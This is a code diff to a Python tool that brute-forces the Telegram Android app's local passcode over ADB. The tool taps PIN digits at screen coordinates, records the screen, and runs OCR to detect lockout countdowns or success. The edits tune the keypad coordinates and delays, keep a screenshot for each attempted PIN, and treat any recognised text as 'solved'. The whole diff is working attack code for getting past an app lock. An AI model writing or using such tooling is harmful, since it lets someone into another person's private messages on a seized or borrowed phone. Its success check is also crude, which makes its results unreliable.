@@ -51,11 +51,13 @@ import pytesseract
 from PIL import Image
 from dotenv import load_dotenv
 
+
 # ANSI color codes
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 RED = "\033[91m"
 RESET = "\033[0m"
+
 
 # Banner
 print(f"{YELLOW}========================================{RESET}")
@@ -70,19 +72,20 @@ print(f"{YELLOW}[*] ⏳ Using device serial: {DEVICE_SERIAL}{RESET}")
 
 # Attempt to load configuration from config.py, fall back to defaults if missing
 try:
-    from config import DELAY, ADB_HOST, ADB_PORT, LOG_FILE, PIN_FIELD_X, PIN_FIELD_Y, KEYPAD_COORDS, APP_PACKAGE, TESSERACT_PATH, SCRCPY_PATH, FFMPEG_PATH
+    from config import DELAY, KEEP_SCREENSHOT, ADB_HOST, ADB_PORT, LOG_FILE, PIN_FIELD_X, PIN_FIELD_Y, KEYPAD_COORDS, APP_PACKAGE, TESSERACT_PATH, SCRCPY_PATH, FFMPEG_PATH
 except ImportError:
     print(f"{YELLOW}[*] ⏳ Config file not found, using default values.{RESET}")
     DELAY = 23  # Default delay if no countdown detected
+    KEEP_SCREENSHOT=True #keep screenshot each pin tested
     ADB_HOST = "127.0.0.1"
     ADB_PORT = 5037
     LOG_FILE = "pin_attempts.log"  # Log file for attempted PINs
     PIN_FIELD_X = 450  # Near "Enter your PIN" (adjust if needed)
     PIN_FIELD_Y = 320  # Adjust if needed
     KEYPAD_COORDS = {
-        '1': (210, 1300), '2': (460, 1300), '3': (890, 1300),
-        '4': (300, 1400), '5': (500, 1400), '6': (800, 1400),
-        '7': (300, 1700), '8': (460, 1700), '9': (800, 1700),
+        '1': (285, 1218), '2': (460, 1300), '3': (890, 1300),
+        '4': (285, 1400), '5': (500, 1400), '6': (800, 1400),
+        '7': (285, 1700), '8': (460, 1700), '9': (800, 1700),
         '0': (460, 1930)
     }
     APP_PACKAGE = "org.telegram.messenger"  # Telegram package (adjust if modified)
@@ -124,7 +127,7 @@ def get_current_focus(device):
         print(f"{RED}[!] 🚫 Error getting current focus: {e}{RESET}")
         return ""
 
-def record_screen(output_file="temp.mp4"):
+def record_screen(pin_str,output_file="temp.mp4"):
     """Record a 1-second video using scrcpy and extract the first frame."""
     # Clean up existing temp files to avoid conflicts
     for temp_file in ["temp.png", "temp.mp4"]:
@@ -145,7 +148,7 @@ def record_screen(output_file="temp.mp4"):
             return None
         
         # Extract first frame
-        frame_file = output_file.replace(".mp4", ".png")
+        frame_file = output_file.replace(".mp4", pin_str+".png") # ADD PIN NUMBER FOR VERBOSING
         subprocess.run([FFMPEG_PATH, "-i", output_file, "-vf", "select='eq(n,0)'", "-vframes", "1", frame_file], 
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f"{YELLOW}[*] ⏳ First frame extracted as {frame_file}{RESET}")
@@ -191,12 +194,22 @@ def ocr_countdown(image_path):
         countdown_keywords = ["countdown", "30s", "try again", "waiting 30 seconds", "failed", "incorrect"]
         if any(keyword in text for keyword in countdown_keywords):
             print(f"{YELLOW}[*] ⏳ Generic countdown detected, using default delay.{RESET}")
-            return DELAY
+            return None
         
-        return None  # No countdown confirmed
+        #if privacy display on
+        if text=="":
+            print(f"{YELLOW}[*] ⏳ No OCR text detected ,Probably because privacy screen, Using Default  {DELAY}.{RESET}")
+
+            return None  # No countdown confirmed
+        if len(text)!=0:
+            return -1 # FOR SOLVED
     except Exception as e:
         print(f"{RED}[!] 🚫 Error in OCR: {e}{RESET}")
         return None
+    
+
+    
+
 
 def get_last_pin():
     """Read the last attempted PIN from the log file."""
@@ -233,36 +246,45 @@ def send_pin(device, pin, initial_focus_hex):
             time.sleep(0.3)  # Delay for keypad response
         
         print(f"{YELLOW}[*] ⏳ Trying PIN: {pin_str}{RESET}")
+  
         
         # Log attempt
         with open(LOG_FILE, "a") as f:
             f.write(f"Tried PIN: {pin_str} at {time.ctime()}\n")
         
         # Wait for auto-submission and response
-        time.sleep(2)  # Give app time to process
+        time.sleep(10)  # Give app time to process
         
         # Record screen and check for countdown or keypad
-        screenshot = record_screen()
+        screenshot = record_screen(pin_str)
+        print(screenshot)
+        print(os.path.exists(screenshot))
+
         if screenshot:
             delay = ocr_countdown(screenshot)
+
+            if(delay ==-1):#SOLVED THE PIN
+                return True; 
             if delay is not None:  # Countdown or keypad detected
                 print(f"{YELLOW}[-] ⏳ PIN {pin_str} failed, countdown or keypad detected{RESET}")
                 time.sleep(delay if delay else DELAY)
-                if os.path.exists(screenshot):
+                if os.path.exists(screenshot) and not KEEP_SCREENSHOT:#improved
                     os.remove(screenshot)
                 return False
+            if delay is None: #PATCHING
+                time.sleep(delay if delay else DELAY)
         
         # Check if app is Telegram and hex has changed
         current_focus = get_current_focus(device)
         if APP_PACKAGE not in current_focus:
             print(f"{RED}[-] 🚫 PIN {pin_str} failed, not Telegram app{RESET}")
-            if os.path.exists(screenshot):
+            if os.path.exists(screenshot) and not KEEP_SCREENSHOT:#improved
                 os.remove(screenshot)
             return False
         current_focus_hex = current_focus.split(" ")[0] if current_focus else ""
         if current_focus_hex == initial_focus_hex:
             print(f"{YELLOW}[-] ⏳ PIN {pin_str} failed, hex unchanged{RESET}")
-            if os.path.exists(screenshot):
+            if os.path.exists(screenshot) and not KEEP_SCREENSHOT: #improved
                 os.remove(screenshot)
             return False
         
@@ -274,8 +296,10 @@ def send_pin(device, pin, initial_focus_hex):
             print(f"{GREEN}[+] ✅ Proof saved: {proof_video} and {proof_frame}{RESET}")
         else:
             print(f"{YELLOW}[*] ⏳ Failed to save proof, verify manually.{RESET}")
-        if os.path.exists(screenshot):
-            os.remove(screenshot)
+
+
+        if os.path.exists(screenshot) and not KEEP_SCREENSHOT:#improved
+                os.remove(screenshot)
         with open(LOG_FILE, "a") as f:
             f.write(f"Tried PIN: {pin_str} at {time.ctime()} (SUCCESS)\n")
         return True
@@ -284,8 +308,6 @@ def send_pin(device, pin, initial_focus_hex):
         print(f"{RED}[!] 🚫 Error sending PIN {pin_str}: {e}{RESET}")
         with open(LOG_FILE, "a") as f:
             f.write(f"Tried PIN: {pin_str} at {time.ctime()} (ERROR)\n")
-        if os.path.exists(screenshot):
-            os.remove(screenshot)
         return False
 
 def main():
@@ -301,11 +323,11 @@ def main():
     initial_focus = get_current_focus(device)
     print(f"{YELLOW}[*] ⏳ Initial app focus: {initial_focus}{RESET}")
     initial_focus_hex = None
-    if not initial_focus or "org.telegram.messenger.AquaIcon" not in initial_focus:
+    if not initial_focus or "org.telegram.messenger" not in initial_focus:
         print(f"{RED}[!] 🚫 The app focus is not on the Telegram PIN screen. Please open the Telegram app manually and leave it on the PIN entry screen.{RESET}")
         input(f"{YELLOW}Press Enter to verify app focus again...{RESET}")
         initial_focus = get_current_focus(device)
-        if not initial_focus or "org.telegram.messenger.AquaIcon" not in initial_focus:
+        if not initial_focus or "org.telegram.messenger" not in initial_focus:
             print(f"{RED}[!] 🚫 Telegram app is still not focused. Please ensure it is open on the PIN screen.{RESET}")
             sys.exit(1)
         print(f"{GREEN}[+] ✅ App focus verified: {initial_focus}{RESET}")
